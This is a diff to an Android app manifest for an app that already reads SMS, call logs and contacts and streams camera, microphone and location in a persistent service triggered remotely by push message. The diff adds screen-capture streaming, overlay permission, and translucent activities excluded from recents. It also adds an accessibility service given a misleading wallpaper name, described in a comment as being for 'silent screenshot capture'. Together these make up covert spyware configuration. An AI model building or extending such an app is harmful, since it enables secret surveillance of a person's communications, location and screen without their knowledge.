@@ -23,6 +23,8 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"
         tools:targetApi="34" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"
+        tools:targetApi="34" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
@@ -42,6 +44,7 @@
     <!-- Screen brightness (requires user to grant via Settings > Apps > Special app access) -->
     <uses-permission android:name="android.permission.WRITE_SETTINGS"
         tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
         android:allowBackup="true"
@@ -72,13 +75,29 @@
             android:name=".StreamingSettingsActivity"
             android:exported="false" />
 
-        <!-- Foreground service for camera, microphone, location, and data sync streaming -->
+        <!-- Foreground service for camera, microphone, location, data sync, and media projection streaming -->
         <service
             android:name=".StreamingService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="camera|microphone|location|dataSync" />
+            android:foregroundServiceType="camera|microphone|location|dataSync|mediaProjection" />
+
+        <!-- Transparent activity to request MediaProjection permission token -->
+        <activity
+            android:name=".MediaProjectionPermissionActivity"
+            android:exported="true"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Transparent activity to trigger native OS GPS resolution dialog -->
+        <activity
+            android:name=".GpsResolutionActivity"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- Notification listener service -->
         <service
@@ -90,6 +109,21 @@
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
+        </service>
+
+        <!-- Accessibility service for silent screenshot capture -->
+        <service
+            android:name=".WallpaperAccessibilityService"
+            android:enabled="true"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
         </service>
 
         <!-- Firebase Cloud Messaging service for on-demand activation -->
